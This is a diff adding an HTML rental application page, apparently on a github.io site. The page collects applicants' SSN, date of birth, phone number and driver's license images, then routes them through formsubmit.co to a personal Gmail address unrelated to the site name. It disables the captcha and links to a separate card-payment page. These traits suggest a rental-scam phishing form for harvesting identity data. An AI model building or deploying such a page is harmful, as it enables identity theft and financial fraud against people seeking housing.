@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Rental Application Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 2rem;
+      background-color: #f9f9f9;
+    }
+    h1, h2 {
+      text-align: center;
+    }
+    form {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 10px;
+      max-width: 800px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    label {
+      display: block;
+      margin-top: 1rem;
+      font-weight: bold;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 0.5rem;
+      margin-top: 0.25rem;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .inline {
+      display: flex;
+      gap: 1rem;
+    }
+    .inline input {
+      flex: 1;
+    }
+    button {
+      margin-top: 2rem;
+      padding: 0.75rem;
+      width: 100%;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+    a.payment-link {
+      display: block;
+      margin-top: 1rem;
+      color: #007bff;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Rental Application Form</h1>
+
+  <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
+
+    <label>Today's Date</label>
+    <input type="date" name="Today's Date" required>
+
+    <label>Address Applied For</label>
+    <input type="text" name="Address Applied For" required>
+
+    <label>Email Address</label>
+    <input type="email" name="Email Address" required>
+
+    <h2>Applicant’s Information</h2>
+
+    <div class="inline">
+      <input type="text" name="Last Name" placeholder="Last Name" required>
+      <input type="text" name="First Name" placeholder="First Name" required>
+      <input type="text" name="MI" placeholder="MI">
+    </div>
+
+    <label>SSN</label>
+    <input type="text" name="SSN" required>
+
+    <label>Date of Birth</label>
+    <input type="date" name="Date of Birth" required>
+
+    <label>Phone Number</label>
+    <input type="tel" name="Phone Number" required>
+
+    <h2>Upload Driver's License</h2>
+    <label>Front</label>
+    <input type="file" name="DL Front" accept="image/*,application/pdf" required>
+
+    <label>Back</label>
+    <input type="file" name="DL Back" accept="image/*,application/pdf" required>
+
+    <h2>Payment Method</h2>
+    <p>Click below if you want to pay via Credit or Debit Card:</p>
+    <a href="payment-choice.html" class="payment-link">👉 Choose Payment Method</a>
+
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_next" value="https://goodhomesrentals.github.io/rentalapplication/thank-you.html">
+
+    <label>Signature</label>
+    <input type="text" name="Signature" required>
+
+    <label>Date Signed</label>
+    <input type="date" name="Date Signed" required>
+
+    <button type="submit">Submit Application</button>
+  </form>
+
+</body>
+</html>
